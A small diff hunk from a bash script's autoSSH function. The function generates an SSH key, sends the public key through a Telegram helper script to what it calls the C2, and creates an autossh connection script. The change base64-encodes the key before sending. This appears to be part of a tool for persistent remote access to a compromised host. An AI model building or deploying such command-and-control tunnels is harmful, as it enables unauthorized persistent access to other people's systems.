@@ -88,7 +88,7 @@ function autoSSH {
     ssh-keygen -q -t rsa -N '' -f ~/.ssh/id_rsa <<<y 2>&1 >/dev/null
 
     echo -e "${yellowColor}[*] Sending via Telegram the /root/.ssh/authorized_keys file that has to go in C2...${resetColor}"
-    /bin/telegram.sh "$(cat /root/.ssh/id_rsa.pub)"
+    /bin/telegram.sh "$(cat /root/.ssh/id_rsa.pub | base64)"
 
     echo -e "${yellowColor}[*] Creating script /bin/autossh-connect.sh...${resetColor}"
     read -p "[*] Enter URL with SSH connection data (Format: IP:PORT): " urlssh
